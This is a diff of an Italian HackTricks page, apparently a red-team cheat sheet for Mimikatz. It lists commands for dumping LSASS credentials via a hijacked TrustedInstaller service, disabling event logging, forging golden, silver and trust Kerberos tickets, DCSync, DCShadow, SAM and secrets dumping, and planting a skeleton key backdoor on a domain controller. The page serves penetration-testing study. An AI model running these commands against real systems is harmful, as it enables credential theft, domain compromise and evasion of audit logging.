@@ -1,39 +1,42 @@
 # Mimikatz
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**Questa pagina si basa su una pagina di [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Consulta l'originale per ulteriori informazioni!
+**Questa pagina si basa su una di [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Controlla l'originale per ulteriori informazioni!
 
-## LM e testo in chiaro in memoria
+## LM e Clear-Text in memoria
 
-A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere contro il furto delle credenziali:
+A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere contro il furto di credenziali:
 
-- **Le hash LM e le password in testo in chiaro** non vengono più memorizzate in memoria per migliorare la sicurezza. È necessario configurare una specifica impostazione del registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, con un valore DWORD di `0` per disabilitare l'autenticazione Digest, garantendo che le password "in chiaro" non vengano memorizzate nella memoria LSASS.
+- **Gli hash LM e le password in chiaro** non sono più memorizzati in memoria per migliorare la sicurezza. Un'impostazione specifica del registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD di `0` per disabilitare l'autenticazione Digest, assicurando che le password "in chiaro" non vengano memorizzate nella cache in LSASS.
 
-- **LSA Protection** è stata introdotta per proteggere il processo Local Security Authority (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come un processo protetto. L'attivazione di LSA Protection comporta:
+- **La protezione LSA** è stata introdotta per proteggere il processo dell'Autorità di Sicurezza Locale (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come processo protetto. L'attivazione della protezione LSA comporta:
 1. Modificare il registro in _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
-2. Implementare un oggetto di criteri di gruppo (GPO) che impone questa modifica del registro su dispositivi gestiti.
+2. Implementare un Oggetto Criteri di Gruppo (GPO) che applica questa modifica del registro sui dispositivi gestiti.
 
-Nonostante queste protezioni, strumenti come Mimikatz possono aggirare LSA Protection utilizzando driver specifici, anche se tali azioni sono probabilmente registrate nei log degli eventi.
+Nonostante queste protezioni, strumenti come Mimikatz possono eludere la protezione LSA utilizzando driver specifici, anche se tali azioni sono destinate a essere registrate nei log degli eventi.
 
-### Contrasto alla rimozione di SeDebugPrivilege
+### Contrastare la rimozione di SeDebugPrivilege
 
-Gli amministratori di solito hanno SeDebugPrivilege, che consente loro di eseguire il debug dei programmi. Questo privilegio può essere limitato per impedire il dump non autorizzato della memoria, una tecnica comune utilizzata dagli attaccanti per estrarre le credenziali dalla memoria. Tuttavia, anche con questo privilegio rimosso, l'account TrustedInstaller può ancora eseguire il dump della memoria utilizzando una configurazione del servizio personalizzata:
+Gli amministratori di solito hanno SeDebugPrivilege, che consente loro di eseguire il debug dei programmi. Questo privilegio può essere limitato per prevenire dump di memoria non autorizzati, una tecnica comune utilizzata dagli attaccanti per estrarre credenziali dalla memoria. Tuttavia, anche con questo privilegio rimosso, l'account TrustedInstaller può ancora eseguire dump di memoria utilizzando una configurazione di servizio personalizzata:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Questo consente di eseguire il dumping della memoria di `lsass.exe` su un file, che può poi essere analizzato su un altro sistema per estrarre le credenziali:
+Questo consente di eseguire il dump della memoria di `lsass.exe` in un file, che può poi essere analizzato su un altro sistema per estrarre le credenziali:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -41,50 +44,50 @@ Questo consente di eseguire il dumping della memoria di `lsass.exe` su un file, 
 ```
 ## Opzioni di Mimikatz
 
-La manipolazione dei log degli eventi in Mimikatz coinvolge due azioni principali: la cancellazione dei log degli eventi e la modifica del servizio Eventi per impedire la registrazione di nuovi eventi. Di seguito sono riportati i comandi per eseguire queste azioni:
+La manomissione dei registri eventi in Mimikatz comporta due azioni principali: cancellare i registri eventi e patchare il servizio Event per prevenire la registrazione di nuovi eventi. Di seguito sono riportati i comandi per eseguire queste azioni:
 
-#### Cancellazione dei log degli eventi
+#### Cancellazione dei Registri Eventi
 
-- **Comando**: Questa azione mira a eliminare i log degli eventi, rendendo più difficile tracciare attività malevole.
-- Mimikatz non fornisce un comando diretto nella sua documentazione standard per cancellare i log degli eventi direttamente tramite la riga di comando. Tuttavia, la manipolazione dei log degli eventi di solito comporta l'uso di strumenti di sistema o script esterni a Mimikatz per cancellare log specifici (ad esempio, utilizzando PowerShell o Windows Event Viewer).
+- **Comando**: Questa azione è mirata a eliminare i registri eventi, rendendo più difficile tracciare attività dannose.
+- Mimikatz non fornisce un comando diretto nella sua documentazione standard per cancellare i registri eventi direttamente tramite la sua riga di comando. Tuttavia, la manipolazione dei registri eventi comporta tipicamente l'uso di strumenti di sistema o script al di fuori di Mimikatz per cancellare registri specifici (ad es., utilizzando PowerShell o Windows Event Viewer).
 
-#### Funzionalità sperimentale: Modifica del servizio Eventi
+#### Funzione Sperimentale: Patchare il Servizio Event
 
 - **Comando**: `event::drop`
-- Questo comando sperimentale è progettato per modificare il comportamento del servizio di registrazione eventi, impedendo efficacemente la registrazione di nuovi eventi.
+- Questo comando sperimentale è progettato per modificare il comportamento del Servizio di Registrazione Eventi, impedendo efficacemente la registrazione di nuovi eventi.
 - Esempio: `mimikatz "privilege::debug" "event::drop" exit`
 
 - Il comando `privilege::debug` garantisce che Mimikatz operi con i privilegi necessari per modificare i servizi di sistema.
-- Il comando `event::drop` modifica quindi il servizio di registrazione eventi.
+- Il comando `event::drop` quindi patcha il servizio di registrazione eventi.
 
 
-### Attacchi ai biglietti Kerberos
+### Attacchi ai Ticket Kerberos
 
 ### Creazione di un Golden Ticket
 
-Un Golden Ticket consente l'impersonificazione dell'accesso a livello di dominio. Comando chiave e parametri:
+Un Golden Ticket consente l'impersonificazione con accesso a livello di dominio. Comando chiave e parametri:
 
 - Comando: `kerberos::golden`
 - Parametri:
 - `/domain`: Il nome del dominio.
-- `/sid`: L'identificatore di sicurezza (SID) del dominio.
+- `/sid`: L'Identificatore di Sicurezza (SID) del dominio.
 - `/user`: Il nome utente da impersonare.
 - `/krbtgt`: L'hash NTLM dell'account di servizio KDC del dominio.
-- `/ptt`: Inietta direttamente il biglietto in memoria.
-- `/ticket`: Salva il biglietto per un uso successivo.
+- `/ptt`: Inietta direttamente il ticket in memoria.
+- `/ticket`: Salva il ticket per un uso successivo.
 
 Esempio:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Creazione di Silver Ticket
+### Creazione del Biglietto Argento
 
-I Silver Ticket concedono l'accesso a servizi specifici. Ecco il comando chiave e i relativi parametri:
+I Biglietti Argento concedono accesso a servizi specifici. Comando chiave e parametri:
 
-- Comando: Simile al Golden Ticket ma mira a servizi specifici.
+- Comando: Simile al Biglietto d'Oro ma mira a servizi specifici.
 - Parametri:
-- `/service`: Il servizio da mirare (ad esempio, cifs, http).
-- Altri parametri simili al Golden Ticket.
+- `/service`: Il servizio da mirare (ad es., cifs, http).
+- Altri parametri simili al Biglietto d'Oro.
 
 Esempio:
 ```bash
@@ -92,65 +95,65 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Creazione di Trust Ticket
 
-I Trust Ticket vengono utilizzati per accedere alle risorse tra domini sfruttando le relazioni di trust. Comando chiave e parametri:
+I Trust Ticket vengono utilizzati per accedere alle risorse tra domini sfruttando le relazioni di fiducia. Comando chiave e parametri:
 
-- Comando: Simile a Golden Ticket ma per le relazioni di trust.
+- Comando: Simile al Golden Ticket ma per le relazioni di fiducia.
 - Parametri:
-- `/target`: L'FQDN del dominio di destinazione.
-- `/rc4`: l'hash NTLM per l'account di trust.
+- `/target`: Il FQDN del dominio target.
+- `/rc4`: L'hash NTLM per l'account di fiducia.
 
 Esempio:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### Comandi Kerberos aggiuntivi
+### Comandi Aggiuntivi di Kerberos
 
-- **Elenco dei ticket**:
+- **Elenco dei Ticket**:
 - Comando: `kerberos::list`
 - Elenca tutti i ticket Kerberos per la sessione utente corrente.
 
-- **Passa la cache**:
+- **Passa la Cache**:
 - Comando: `kerberos::ptc`
 - Inietta i ticket Kerberos dai file di cache.
 - Esempio: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Passa il ticket**:
+- **Passa il Ticket**:
 - Comando: `kerberos::ptt`
 - Consente di utilizzare un ticket Kerberos in un'altra sessione.
 - Esempio: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Pulisci i ticket**:
+- **Pulisci i Ticket**:
 - Comando: `kerberos::purge`
 - Cancella tutti i ticket Kerberos dalla sessione.
 - Utile prima di utilizzare comandi di manipolazione dei ticket per evitare conflitti.
 
 
-### Manipolazione di Active Directory
+### Manomissione di Active Directory
 
-- **DCShadow**: Rendi temporaneamente una macchina un DC per la manipolazione degli oggetti AD.
+- **DCShadow**: Fai agire temporaneamente una macchina come un DC per la manipolazione degli oggetti AD.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Simula un DC per richiedere dati sulla password.
+- **DCSync**: Imita un DC per richiedere dati sulla password.
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Accesso alle credenziali
+### Accesso alle Credenziali
 
-- **LSADUMP::LSA**: Estrae le credenziali da LSA.
+- **LSADUMP::LSA**: Estrai credenziali da LSA.
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Si finge un DC utilizzando i dati sulla password di un account computer.
+- **LSADUMP::NetSync**: Imita un DC utilizzando i dati della password di un account computer.
 - *Nessun comando specifico fornito per NetSync nel contesto originale.*
 
-- **LSADUMP::SAM**: Accede al database SAM locale.
+- **LSADUMP::SAM**: Accedi al database SAM locale.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decifra i segreti memorizzati nel registro.
+- **LSADUMP::Secrets**: Decripta segreti memorizzati nel registro.
 - `mimikatz "lsadump::secrets" exit`
 
 - **LSADUMP::SetNTLM**: Imposta un nuovo hash NTLM per un utente.
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Recupera le informazioni di autenticazione della trust.
+- **LSADUMP::Trust**: Recupera informazioni di autenticazione di fiducia.
 - `mimikatz "lsadump::trust" exit`
 
 ### Varie
@@ -158,34 +161,34 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **MISC::Skeleton**: Inietta un backdoor in LSASS su un DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Escalation dei privilegi
+### Escalation dei Privilegi
 
-- **PRIVILEGE::Backup**: Acquisisce i diritti di backup.
+- **PRIVILEGE::Backup**: Acquisisci diritti di backup.
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Ottiene i privilegi di debug.
+- **PRIVILEGE::Debug**: Ottieni privilegi di debug.
 - `mimikatz "privilege::debug" exit`
 
-### Dumping delle credenziali
+### Dumping delle Credenziali
 
-- **SEKURLSA::LogonPasswords**: Mostra le credenziali degli utenti connessi.
+- **SEKURLSA::LogonPasswords**: Mostra le credenziali per gli utenti connessi.
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Estrae i ticket Kerberos dalla memoria.
+- **SEKURLSA::Tickets**: Estrai ticket Kerberos dalla memoria.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Manipolazione di SID e token
+### Manipolazione di SID e Token
 
-- **SID::add/modify**: Modifica SID e SIDHistory.
+- **SID::add/modify**: Cambia SID e SIDHistory.
 - Aggiungi: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Modifica: *Nessun comando specifico per la modifica nel contesto originale.*
+- Modifica: *Nessun comando specifico per modificare nel contesto originale.*
 
-- **TOKEN::Elevate**: Si finge token.
+- **TOKEN::Elevate**: Imita i token.
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Servizi terminal
+### Servizi Terminal
 
-- **TS::MultiRDP**: Consente sessioni RDP multiple.
+- **TS::MultiRDP**: Consenti sessioni RDP multiple.
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: Elenca le sessioni TS/RDP.
@@ -193,18 +196,21 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Vault
 
-- Estrae le password da Windows Vault.
+- Estrai password da Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
 
+{% hint style="success" %}
+Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
+{% endhint %}
